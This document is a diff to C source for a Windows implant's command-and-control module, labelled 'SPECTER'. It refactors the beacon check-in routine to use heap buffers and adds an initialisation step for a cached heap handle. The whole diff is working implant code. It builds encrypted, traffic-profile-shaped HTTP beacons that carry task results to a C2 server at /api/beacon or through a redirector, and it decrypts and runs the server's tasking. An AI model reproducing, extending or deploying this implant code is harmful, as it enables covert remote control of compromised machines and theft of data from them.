@@ -15,6 +15,7 @@
 #include "profile.h"
 #include "transform.h"
 #include "task_exec.h"
+#include "heap.h"
 
 /* ------------------------------------------------------------------ */
 /*  Static state                                                       */
@@ -1378,30 +1379,20 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     if (!ctx || !ctx->config || !ctx->comms_ctx)
         return STATUS_INVALID_PARAMETER;
 
-    /* ---- Declare all heap-trackable pointers at the top ---- */
+    /* All heap-trackable pointers — no large stack buffers anywhere.
+       Total stack footprint of this function: ~200 bytes (pointers + scalars). */
     NTSTATUS status = STATUS_UNSUCCESSFUL;
-
-    BYTE *payload = NULL;
-    BOOL payload_heap = FALSE;
+    BYTE *payload      = NULL;
+    BYTE *http_buf     = NULL;
+    BYTE *wire_buf     = NULL;
+    BYTE *ciphertext   = NULL;
+    BYTE *transformed  = NULL;
+    BYTE *resp_buf     = NULL;
+    BYTE *body_heap    = NULL;   /* heap copy of profile body */
+    BYTE *headers_heap = NULL;   /* heap copy of profile headers */
+    BYTE *extracted    = NULL;   /* profile extract buffer */
+    BYTE *resp_plain   = NULL;   /* decrypted response buffer */
     DWORD payload_buf_size = 0;
-
-    BYTE *http_buf = NULL;
-    BOOL http_heap = FALSE;
-
-    BYTE *wire_buf = NULL;
-    BOOL wire_heap = FALSE;
-
-    BYTE *ciphertext = NULL;
-    BOOL ct_heap = FALSE;
-
-    BYTE *transformed = NULL;
-    BOOL transform_heap = FALSE;
-
-    /* Stack buffers for fallback (declared here so cleanup can zero them) */
-    BYTE payload_stack[1024];
-    BYTE http_stack[8192];
-    BYTE ct_stack[512];
-    BYTE wire_stack[1024];
 
     COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
     IMPLANT_CONFIG *cfg = cfg_get(ctx);
@@ -1412,9 +1403,9 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     /* Reconnect TCP for each checkin (HTTP/1.0 — server closes after response) */
     if (comms->state != COMMS_STATE_DISCONNECTED) {
         if (ch->needs_tls && comms->api.tls_available)
-            comms_tls_close(comms);  /* closes TLS + underlying TCP */
+            comms_tls_close(comms);
         else
-            comms_tcp_close(comms);  /* plain TCP close */
+            comms_tcp_close(comms);
     }
 
     COMMS_TRACE("[SPECTER] checkin: tcp_connect...");
@@ -1430,79 +1421,44 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     }
     COMMS_TRACE("[SPECTER] checkin: connected");
 
-    /* Build plaintext TLV payload.
-     * When task results are pending, use a heap-allocated buffer large enough
-     * to hold the results. Otherwise use a small stack buffer. */
+    /* ---- Build plaintext TLV payload (heap) ---- */
     COMMS_TRACE("[SPECTER] checkin: build_payload...");
-    payload = payload_stack;
-    payload_buf_size = sizeof(payload_stack);
-
+    payload_buf_size = 1024;
     if (ctx->task_result_count > 0) {
-        /* Estimate needed size: 512 base + per-result overhead + data */
         DWORD needed = 512;
         for (DWORD ri = 0; ri < ctx->task_result_count; ri++) {
             needed += 128 + ctx->task_results[ri].data_len;
         }
-        if (needed > 0xFFFF) needed = 0xFFFF; /* TLV u16 length cap */
-        BYTE *heap_buf = (BYTE *)task_alloc(needed);
-        if (heap_buf) {
-            payload = heap_buf;
-            payload_buf_size = needed;
-            payload_heap = TRUE;
-        }
+        if (needed > payload_buf_size) payload_buf_size = needed;
+        if (payload_buf_size > 0xFFFF) payload_buf_size = 0xFFFF;
     }
+    payload = (BYTE *)heap_alloc_cached(payload_buf_size);
+    if (!payload) { status = STATUS_NO_MEMORY; goto cleanup; }
 
     DWORD payload_len = build_checkin_payload(ctx, cfg, comms->msg_seq, payload, payload_buf_size);
-    if (payload_len == 0) {
-        status = STATUS_UNSUCCESSFUL;
-        goto cleanup;
-    }
+    if (payload_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
     COMMS_TRACE("[SPECTER] checkin: payload built OK");
 
-    /* HTTP buffer: heap-allocate when payload is large (task results),
-       stack-allocate for normal checkins. The HTTP frame includes
-       headers (~300 bytes) + encrypted body (payload + AEAD overhead).
-       Minimum size handles normal checkins; scale up for results. */
-    DWORD http_buf_size = 8192;
-    DWORD wire_overhead = 300 + 4 + 24 + 16; /* HTTP hdrs + wire len + header + tag */
-    if (payload_len + wire_overhead > http_buf_size)
-        http_buf_size = payload_len + wire_overhead + 512; /* extra margin */
+    /* ---- HTTP buffer (heap) ---- */
+    DWORD wire_overhead = 300 + 4 + 24 + 16;
+    DWORD http_buf_size = payload_len + wire_overhead + 512;
+    if (http_buf_size < 4096) http_buf_size = 4096;
 
-    http_buf = http_stack;
-
-    if (http_buf_size > sizeof(http_stack)) {
-        BYTE *hbuf = (BYTE *)task_alloc(http_buf_size);
-        if (hbuf) {
-            http_buf = hbuf;
-            http_heap = TRUE;
-        } else {
-            /* Heap alloc failed — fall back to stack but cap payload.
-               This means large results won't be sent this cycle. */
-            http_buf_size = sizeof(http_stack);
-        }
-    }
+    http_buf = (BYTE *)heap_alloc_cached(http_buf_size);
+    if (!http_buf) { status = STATUS_NO_MEMORY; goto cleanup; }
     DWORD http_len = 0;
 
     if (comms->profile && comms->profile->initialized) {
         /* ============== Profile-driven path ============== */
         PROFILE_CONFIG *prof = comms->profile;
 
-        /* Step 1: transform_send — compress → encrypt → encode */
-        DWORD transform_buf_size = payload_len + 4096; /* payload + encoding expansion */
+        /* Step 1: transform_send (heap buffer) */
+        DWORD transform_buf_size = payload_len + 4096;
         if (transform_buf_size < TRANSFORM_MAX_OUTPUT)
             transform_buf_size = TRANSFORM_MAX_OUTPUT;
-        BYTE transform_stack_buf[TRANSFORM_MAX_OUTPUT];
-        transformed = transform_stack_buf;
-        if (transform_buf_size > sizeof(transform_stack_buf)) {
-            BYTE *tbuf = (BYTE *)task_alloc(transform_buf_size);
-            if (tbuf) {
-                transformed = tbuf;
-                transform_heap = TRUE;
-            } else {
-                /* Fall back to stack but cap size */
-                transform_buf_size = sizeof(transform_stack_buf);
-            }
-        }
+        transformed = (BYTE *)heap_alloc_cached(transform_buf_size);
+        if (!transformed) { status = STATUS_NO_MEMORY; goto cleanup; }
+
         DWORD transformed_len = 0;
         status = transform_send(payload, payload_len, comms->session_key,
                                  &prof->transform, transformed, &transformed_len,
@@ -1510,33 +1466,39 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         spec_memset(payload, 0, payload_buf_size);
         if (!NT_SUCCESS(status)) goto cleanup;
 
-        /* Step 2: profile_embed_data — embed into body template */
-        BYTE body_buf[4096];
-        DWORD body_len = profile_embed_data(prof, transformed, transformed_len,
-                                             body_buf, sizeof(body_buf));
-        if (body_len == 0) {
-            status = STATUS_UNSUCCESSFUL;
-            goto cleanup;
-        }
+        /* Step 2: profile_embed_data (heap buffer) */
+        DWORD body_heap_size = 4096;
+        body_heap = (BYTE *)heap_alloc_cached(body_heap_size);
+        if (!body_heap) { status = STATUS_NO_MEMORY; goto cleanup; }
 
-        /* Step 3: profile_build_headers — expand template headers */
-        char headers_str[2048];
-        DWORD headers_len = profile_build_headers(prof, headers_str, sizeof(headers_str));
+        DWORD embed_body_len = profile_embed_data(prof, transformed, transformed_len,
+                                                   body_heap, body_heap_size);
+        if (embed_body_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
+
+        /* Step 3: profile_build_headers (heap buffer) */
+        DWORD headers_heap_size = 2048;
+        headers_heap = (BYTE *)heap_alloc_cached(headers_heap_size);
+        if (!headers_heap) { status = STATUS_NO_MEMORY; goto cleanup; }
+
+        DWORD headers_len = profile_build_headers(prof, (char *)headers_heap, headers_heap_size);
         (void)headers_len;
 
-        /* Step 4: profile_get_uri — get next URI from rotation */
+        /* Step 4: profile_get_uri */
         const char *uri = profile_get_uri(prof);
 
-        /* Step 5: Build HTTP request with profile-shaped parameters */
+        /* Step 5: Build HTTP request */
         DWORD method = profile_get_method(prof);
         http_len = comms_http_build_request(
             method, uri, ch->url,
-            headers_str[0] ? headers_str : NULL,
-            body_buf, body_len, http_buf, http_buf_size);
-        if (http_len == 0) {
-            status = STATUS_UNSUCCESSFUL;
-            goto cleanup;
-        }
+            ((char *)headers_heap)[0] ? (char *)headers_heap : NULL,
+            body_heap, embed_body_len, http_buf, http_buf_size);
+
+        /* Free profile temporaries early */
+        heap_free_cached(body_heap);    body_heap = NULL;
+        heap_free_cached(headers_heap); headers_heap = NULL;
+        heap_free_cached(transformed);  transformed = NULL;
+
+        if (http_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
 
     } else {
         /* ============== Legacy wire format path ============== */
@@ -1547,12 +1509,9 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         BYTE nonce[AEAD_NONCE_SIZE];
         generate_nonce(comms->msg_seq, cfg->implant_pubkey, nonce);
 
-        /* Allocate ciphertext buffer to match payload size */
-        ciphertext = ct_stack;
-        if (payload_len > sizeof(ct_stack)) {
-            BYTE *ct_alloc = (BYTE *)task_alloc(payload_len);
-            if (ct_alloc) { ciphertext = ct_alloc; ct_heap = TRUE; }
-        }
+        /* Ciphertext buffer (heap) */
+        ciphertext = (BYTE *)heap_alloc_cached(payload_len > 64 ? payload_len : 64);
+        if (!ciphertext) { status = STATUS_NO_MEMORY; goto cleanup; }
 
         BYTE tag[AEAD_TAG_SIZE];
         spec_aead_encrypt(comms->session_key, nonce, payload, payload_len,
@@ -1562,16 +1521,9 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         DWORD wire_body_len = COMMS_WIRE_HEADER_SIZE + payload_len + COMMS_WIRE_TAG_SIZE;
         DWORD wire_total = COMMS_WIRE_LEN_SIZE + wire_body_len;
 
-        /* Allocate wire buffer to fit the full message */
-        wire_buf = wire_stack;
-        if (wire_total > sizeof(wire_stack)) {
-            BYTE *wb = (BYTE *)task_alloc(wire_total);
-            if (wb) { wire_buf = wb; wire_heap = TRUE; }
-            else {
-                status = STATUS_BUFFER_TOO_SMALL;
-                goto cleanup;
-            }
-        }
+        /* Wire buffer (heap) */
+        wire_buf = (BYTE *)heap_alloc_cached(wire_total);
+        if (!wire_buf) { status = STATUS_NO_MEMORY; goto cleanup; }
 
         DWORD wp = 0;
         store32_le_comms(wire_buf + wp, wire_body_len); wp += 4;
@@ -1581,31 +1533,22 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         spec_memcpy(wire_buf + wp, tag, AEAD_TAG_SIZE); wp += AEAD_TAG_SIZE;
 
         COMMS_TRACE("[SPECTER] checkin: building HTTP request");
-        /* Use the channel's configured URI path (from the profile/config),
-           not a hardcoded path. This ensures the redirector's URI filter
-           matches the implant's requests. Fall back to /api/beacon only
-           if no path is configured. */
         const char *req_uri = ch->uri[0] ? ch->uri : "/api/beacon";
         http_len = comms_http_build_request(
             COMMS_HTTP_POST, req_uri, ch->url, NULL,
             wire_buf, wire_total, http_buf, http_buf_size);
 
-        /* Free heap-allocated wire and ciphertext buffers early — no longer needed */
-        if (wire_heap) { task_free(wire_buf); wire_buf = NULL; wire_heap = FALSE; }
-        if (ct_heap) { task_free(ciphertext); ciphertext = NULL; ct_heap = FALSE; }
-
-        /* Zero the nonce (contains sequence-derived material) */
+        /* Free wire + ciphertext early */
+        heap_free_cached(wire_buf);    wire_buf = NULL;
+        heap_free_cached(ciphertext);  ciphertext = NULL;
         spec_memset(nonce, 0, sizeof(nonce));
 
-        if (http_len == 0) {
-            status = STATUS_UNSUCCESSFUL;
-            goto cleanup;
-        }
+        if (http_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
         COMMS_TRACE("[SPECTER] checkin: HTTP request built, sending...");
     }
 
-    /* Payload no longer needed — free heap buffer before network I/O */
-    if (payload_heap) { task_free(payload); payload = NULL; payload_heap = FALSE; }
+    /* Free payload before network I/O */
+    heap_free_cached(payload); payload = NULL;
 
     /* ---- Send request ---- */
     if (comms->state == COMMS_STATE_TLS_CONNECTED)
@@ -1615,18 +1558,19 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     if (!NT_SUCCESS(status)) goto cleanup;
     COMMS_TRACE("[SPECTER] checkin: sent, receiving response...");
 
-    /* ---- Receive response ---- */
-    BYTE resp_buf[COMMS_RECV_BUF_SIZE];
+    /* ---- Receive response (heap buffer) ---- */
+    resp_buf = (BYTE *)heap_alloc_cached(COMMS_RECV_BUF_SIZE);
+    if (!resp_buf) { status = STATUS_NO_MEMORY; goto cleanup; }
     DWORD resp_total = 0;
 
     for (int attempts = 0; attempts < 10; attempts++) {
         DWORD got = 0;
         if (comms->state == COMMS_STATE_TLS_CONNECTED)
             status = comms_tls_recv(comms, resp_buf + resp_total,
-                                     (DWORD)(sizeof(resp_buf) - resp_total), &got);
+                                     (DWORD)(COMMS_RECV_BUF_SIZE - resp_total), &got);
         else
             status = comms_tcp_recv(comms, resp_buf + resp_total,
-                                     (DWORD)(sizeof(resp_buf) - resp_total), &got);
+                                     (DWORD)(COMMS_RECV_BUF_SIZE - resp_total), &got);
         if (!NT_SUCCESS(status)) goto cleanup;
         resp_total += got;
 
@@ -1648,24 +1592,27 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     /* ---- Process response body ---- */
     if (body && body_len > 0) {
         if (comms->profile && comms->profile->initialized) {
-            /* Profile-driven: extract → transform_recv */
-            BYTE extracted[4096];
-            DWORD extracted_len = 0;
-            DWORD extract_ret = profile_extract_data(comms->profile, body, body_len,
-                                                      extracted, &extracted_len);
-            if (extract_ret > 0 && extracted_len > 0) {
-                BYTE resp_plain[4096];
-                DWORD resp_plain_len = 0;
-                status = transform_recv(extracted, extracted_len,
-                                         comms->session_key,
-                                         &comms->profile->transform,
-                                         resp_plain, &resp_plain_len,
-                                         sizeof(resp_plain));
-                if (NT_SUCCESS(status) && resp_plain_len > 0) {
-                    parse_checkin_response(ctx, comms, resp_plain, resp_plain_len);
+            /* Profile-driven: extract -> transform_recv (all heap) */
+            extracted = (BYTE *)heap_alloc_cached(4096);
+            if (extracted) {
+                DWORD extracted_len = 0;
+                DWORD extract_ret = profile_extract_data(comms->profile, body, body_len,
+                                                          extracted, &extracted_len);
+                if (extract_ret > 0 && extracted_len > 0) {
+                    resp_plain = (BYTE *)heap_alloc_cached(4096);
+                    if (resp_plain) {
+                        DWORD resp_plain_len = 0;
+                        status = transform_recv(extracted, extracted_len,
+                                                 comms->session_key,
+                                                 &comms->profile->transform,
+                                                 resp_plain, &resp_plain_len,
+                                                 4096);
+                        if (NT_SUCCESS(status) && resp_plain_len > 0) {
+                            parse_checkin_response(ctx, comms, resp_plain, resp_plain_len);
+                        }
+                        spec_memset(resp_plain, 0, 4096);
+                    }
                 }
-                spec_memset(resp_plain, 0, sizeof(resp_plain));
-            }
         } else if (body_len > COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE + COMMS_WIRE_TAG_SIZE) {
             /* Legacy wire format:
                [4-byte LE len][12-byte server_id][12-byte nonce][ciphertext][16-byte tag] */
@@ -1675,15 +1622,17 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
             const BYTE *resp_ct = body + COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE;
             const BYTE *resp_tag = resp_ct + resp_ct_len;
 
-            BYTE resp_plain[512];
-            if (resp_ct_len <= sizeof(resp_plain)) {
-                BOOL ok = spec_aead_decrypt(comms->session_key, resp_nonce,
-                                             resp_ct, resp_ct_len, NULL, 0,
-                                             resp_plain, resp_tag);
-                if (ok) {
-                    parse_checkin_response(ctx, comms, resp_plain, resp_ct_len);
+            if (resp_ct_len <= 512) {
+                resp_plain = (BYTE *)heap_alloc_cached(512);
+                if (resp_plain) {
+                    BOOL ok = spec_aead_decrypt(comms->session_key, resp_nonce,
+                                                 resp_ct, resp_ct_len, NULL, 0,
+                                                 resp_plain, resp_tag);
+                    if (ok) {
+                        parse_checkin_response(ctx, comms, resp_plain, resp_ct_len);
+                    }
+                    spec_memset(resp_plain, 0, 512);
                 }
-                spec_memset(resp_plain, 0, sizeof(resp_plain));
             }
         }
     }
@@ -1691,16 +1640,17 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     status = STATUS_SUCCESS;
 
 cleanup:
-    /* Free all heap-allocated buffers */
-    if (payload_heap && payload)         task_free(payload);
-    if (http_heap && http_buf)           task_free(http_buf);
-    if (wire_heap && wire_buf)           task_free(wire_buf);
-    if (ct_heap && ciphertext)           task_free(ciphertext);
-    if (transform_heap && transformed)   task_free(transformed);
-
-    /* Zero sensitive stack buffers */
-    spec_memset(payload_stack, 0, sizeof(payload_stack));
-    spec_memset(ct_stack, 0, sizeof(ct_stack));
+    /* Free all heap-allocated buffers (heap_free_cached is a no-op on NULL) */
+    if (payload) { spec_memset(payload, 0, payload_buf_size); heap_free_cached(payload); }
+    heap_free_cached(http_buf);
+    heap_free_cached(wire_buf);
+    heap_free_cached(ciphertext);
+    heap_free_cached(transformed);
+    heap_free_cached(resp_buf);
+    heap_free_cached(body_heap);
+    heap_free_cached(headers_heap);
+    heap_free_cached(extracted);
+    heap_free_cached(resp_plain);
 
     /* Only clear results and bump counters on success */
     if (NT_SUCCESS(status)) {
@@ -2139,6 +2089,10 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     IMPLANT_CONFIG *cfg = cfg_get(ctx);
     if (!cfg) return (NTSTATUS)0xC0000167; /* 167 = cfg_get returned null */
 
+    /* Initialize cached heap handle (Phase 0.5 — avoid PEB walk on every alloc) */
+    if (!init_heap_cache())
+        return (NTSTATUS)0xC0000168; /* 168 = heap cache init failed */
+
     /* Zero out comms context */
     spec_memset(&g_comms_ctx, 0, sizeof(COMMS_CONTEXT));
     g_comms_ctx.socket = INVALID_SOCKET;
@@ -2217,8 +2171,11 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
 
     /* Perform initial registration check-in */
     COMMS_TRACE("[SPECTER] comms: first checkin...");
+    COMMS_TRACE("[SPECTER] comms: about to call comms_checkin");
     g_comms_ctx.state = COMMS_STATE_REGISTERED;
+    COMMS_TRACE("[SPECTER] comms: state set, calling now");
     status = comms_checkin(ctx);
+    COMMS_TRACE("[SPECTER] comms: comms_checkin returned");
     if (!NT_SUCCESS(status))
         g_comms_ctx.state = COMMS_STATE_TLS_CONNECTED;
 
